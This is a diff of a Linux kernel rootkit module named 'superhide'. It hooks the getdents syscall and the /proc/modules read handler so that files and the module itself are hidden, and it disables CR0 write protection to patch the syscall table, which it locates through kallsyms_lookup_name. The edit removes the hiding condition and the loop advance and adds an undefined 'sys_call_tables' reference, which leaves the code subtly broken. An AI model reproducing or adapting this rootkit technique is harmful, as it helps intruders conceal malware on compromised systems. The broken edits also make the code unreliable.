@@ -21,7 +21,7 @@ struct linux_dirent {
 };
 
 MODULE_LICENSE("GPL"); // Is actually needed on some distros inorder to link with things
-
+void** sys_call_table_ptr;
 // function type for the getdents handler function
 typedef asmlinkage long (*sys_getdents_t)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
 // the original handler
@@ -46,16 +46,12 @@ asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *di
 	for (boff = 0; boff < ret;) {
 		ent = (struct linux_dirent*)(dbuf + boff);
 
-		if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0) // if it has the hide prefix
-			|| (strstr(ent->d_name, MODULE_NAME) != NULL)) {     // or if it has the module name anywhere in it
+			    // or if it has the module name anywhere in it
 			// remove this entry by copying everything after it forward
-			memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
+		memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
 			// and adjust the length reported
-			ret -= ent->d_reclen;
-		} else {
-			// on to the next entry
-			boff += ent->d_reclen;
-		}
+		ret -= ent->d_reclen;
+		
 	}
 	return ret;
 }
@@ -88,10 +84,11 @@ ssize_t proc_modules_read_new(struct file *f, char __user *buf, size_t len, loff
 static int __init lkm_init_module(void) {
 	printk(KERN_INFO "superhide loaded\n");
 
-	printk(KERN_INFO "sys_call_table @ %p\n", sys_call_table);
+	printk(KERN_INFO "sys_call_table @ %p\n", sys_call_tables);
 	
 	// record the original getdents handler
-	sys_getdents_orig = (sys_getdents_t)((void**)sys_call_table)[GETDENTS_SYSCALL_NUM];
+	sys_call_table_ptr = (void *) kallsyms_lookup_name("sys_call_table");
+	sys_getdents_orig = sys_call_table_ptr[GETDENTS_SYSCALL_NUM];
 	
 	printk(KERN_INFO "original sys_getdents @ %p\n", sys_getdents_orig);
 
@@ -103,7 +100,7 @@ static int __init lkm_init_module(void) {
 	write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
 	
 	// add our new handlers
-	sys_call_table[GETDENTS_SYSCALL_NUM] = sys_getdents_new;
+	sys_call_table_ptr[GETDENTS_SYSCALL_NUM] = sys_getdents_new;
 	proc_modules_operations->read = proc_modules_read_new;
 
 	// turn write protect back on
@@ -124,7 +121,7 @@ static void __exit lkm_cleanup_module(void) {
 	// allow us to write to read onlu pages
 	write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
 	// set getdents handler back
-	sys_call_table[GETDENTS_SYSCALL_NUM] = sys_getdents_orig;
+	sys_call_table_ptr[GETDENTS_SYSCALL_NUM] = sys_getdents_orig;
 	// set the /proc/modules read back
 	proc_modules_operations->read = proc_modules_read_orig;
 	// turn write protect back on
